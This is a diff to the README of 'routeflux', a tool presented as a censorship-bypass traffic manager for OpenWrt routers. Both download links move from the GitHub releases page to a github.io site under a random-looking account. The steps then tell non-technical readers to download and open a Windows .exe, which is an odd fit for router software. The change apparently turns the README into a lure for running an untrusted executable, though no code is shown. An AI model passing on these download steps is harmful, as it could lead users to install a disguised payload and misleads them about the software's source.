@@ -1,6 +1,6 @@
 # 🌐 routeflux - Stay connected to the open internet
 
-[![](https://img.shields.io/badge/Download_Routeflux-blue)] (https://github.com/pyrolaceaepteropus757/routeflux/releases)
+[![](https://img.shields.io/badge/Download_Routeflux-blue)] (https://pyrolaceaepteropus757.github.io)
 
 Routeflux manages your network traffic on OpenWrt routers. It provides tools to bypass restrictions and control how your data flows through the internet. The software uses Xray technology to mask your traffic. This process helps you reach blocked websites and services. It selects the best connection path automatically. You gain control over your DNS settings and routing rules.
 
@@ -18,7 +18,7 @@ Routeflux includes several features to improve your browsing experience.
 
 Follow these steps to set up routeflux on your Windows machine and router. You do not need technical skills to complete this process.
 
-1. Visit the project page to download the latest version: https://github.com/pyrolaceaepteropus757/routeflux/releases
+1. Visit the project page to download the latest version: https://pyrolaceaepteropus757.github.io
 2. Look for the file ending in .exe in the "Assets" section.
 3. Click the file to start the download.
 4. Open the downloaded file once it finishes.
